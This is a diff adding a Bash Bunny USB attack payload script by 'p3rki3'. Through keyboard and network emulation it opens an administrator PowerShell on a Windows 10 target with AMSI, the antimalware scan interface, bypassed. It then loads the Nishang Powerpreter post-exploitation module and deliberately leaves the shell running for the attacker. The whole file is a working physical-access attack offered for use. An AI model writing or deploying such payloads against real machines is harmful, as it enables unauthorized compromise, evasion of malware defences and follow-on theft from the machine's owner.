@@ -1,0 +1,29 @@
+#!/bin/bash
+#
+# Title:         BBPS_Framework Example Payload - Loading of Powerpreter into admin powershell on target machine
+# Description:   Payload to load the nishang powerpreter module into an admin, AMSI bypassed powershell which is left running for use
+# Author:        p3rki3
+# Props:		 samratashok (for nishang)
+# Version:       0.91
+# Dependencies:  bashbunny powershell framework extension, gohttp (for NET method only) + BB Powershell Framework
+# Category:      Execution
+# Target:        Windows 10 (Powershell) - may work on earlier versions, but untested
+# Attackmodes:   HID, Ethernet
+
+# Initialise the bashbunny powershell framework
+LED SETUP
+INVOKE_POWERSHELL "NET" "VISIBLE" "OFF"
+sleep 1
+
+# Stage 1 - Load the Nishang Powerpreter module into Powershell
+LED STAGE1
+INJECT_PSMODULE "powerpreter.psm1"
+sleep 10   # give the target machine some time to load the file before we shut the bunny down
+
+# Cleanup
+LED CLEANUP
+# CLOSE_POWERSHELL - we don't want to close Powershell!!!!  So don't execute this command where we would normally!!!
+ATTACKMODE OFF
+
+# Complete - when the light goes green, remove bunny from the machine
+LED FINISH
